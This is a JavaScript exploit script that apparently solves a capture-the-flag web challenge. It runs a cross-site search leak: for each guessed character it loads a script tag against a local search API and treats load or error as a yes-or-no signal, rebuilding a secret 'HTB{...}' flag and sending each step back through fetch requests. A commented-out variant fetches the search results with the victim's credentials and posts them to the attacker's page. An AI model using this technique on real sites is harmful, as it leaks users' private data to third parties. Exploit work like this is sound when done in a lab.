/*fetch('http://127.0.0.1:1337/api/entries/search?q=HTXX', {
  method: 'GET',
  credentials: 'include'
})
.then((response) => response.json())
.then((resp) => {
  fetch('/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '127.0.0.1'
    },
    body: JSON.stringify(resp)
  });
})
.catch((error) => {
  console.log(error);
  fetch('/?' + new URLSearchParams({
    error: error
  }));
});*/

const charList = []

for(let i = 'a'.charCodeAt(0); i <= 'z'.charCodeAt(0); i++){
  charList.push(String.fromCharCode(i));
}
for(let i = '0'.charCodeAt(0); i <= '9'.charCodeAt(0); i++){
  charList.push(String.fromCharCode(i));
}
charList.push('$', '!', '{', '}', '_');

function sendMsg(msg){
  fetch('/msg?' + new URLSearchParams(msg));
}

function checkFlagPrefix(flagPrefix){
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = 'http://127.0.0.1:1337/api/entries/search/?' + new URLSearchParams({
      q: flagPrefix
    });
    script.addEventListener('load', () => {
      resolve();
    });
    script.addEventListener('error', () => {
      reject();
    });
    document.body.appendChild(script);
  });
}

async function bruteFlag(){
  let flag = 'HTB{'

  let goodChar = true;
  while(goodChar && flag.slice(-1) != '}'){
    goodChar = false;
    for await (const i of charList){
      await checkFlagPrefix(flag + i).then(() => {
	goodChar = true;
      }).catch((e) => {});

      if(goodChar){
	flag += i;
	break;
      }
    }
    sendMsg({upd: flag});
  }

  return flag;
}

async function sendFlag(){
  sendMsg({flag: await bruteFlag()});
}

sendMsg({test: 'test'});
sendFlag();
